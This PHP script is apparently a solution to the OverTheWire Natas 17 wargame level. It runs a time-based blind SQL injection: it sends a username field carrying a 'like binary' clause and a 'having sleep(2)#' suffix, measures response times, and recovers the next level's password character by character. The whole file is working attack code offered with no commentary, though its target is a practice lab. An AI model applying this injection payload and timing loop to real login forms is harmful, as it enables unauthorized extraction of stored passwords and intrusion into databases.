<?php
$sleep = 2;
$ifUserExists = function ($injectionString) use ($argv, $sleep) {
    $ch = curl_init('http://natas17.natas.labs.overthewire.org/index.php');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Basic ' . $argv[1],
    ]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=' . $injectionString);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    $time = curl_getinfo($ch)['total_time_us'] / 1000000;
    curl_close($ch);
    return $time > $sleep;
};

$dictionary = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

$injectionPrefix = "natas18\" and password like binary \"";
$injectionPostfix = "\" having sleep($sleep)#";

$password = '';
while ($ifUserExists($injectionPrefix . $password . '%' . $injectionPostfix)) {
    $startStepLength = strlen($password);
    foreach (str_split($dictionary) as $char) {
        $testString = $injectionPrefix . $password . $char . '%' . $injectionPostfix;
        $test = $ifUserExists($testString);
        echo '.';
        if ($ifUserExists($testString)) {
            $password .= $char;
            echo "\n" . $password . "\n";
            break;
        }
    }
    if ($startStepLength === strlen($password)) {
        break;
    }
}

echo $password;

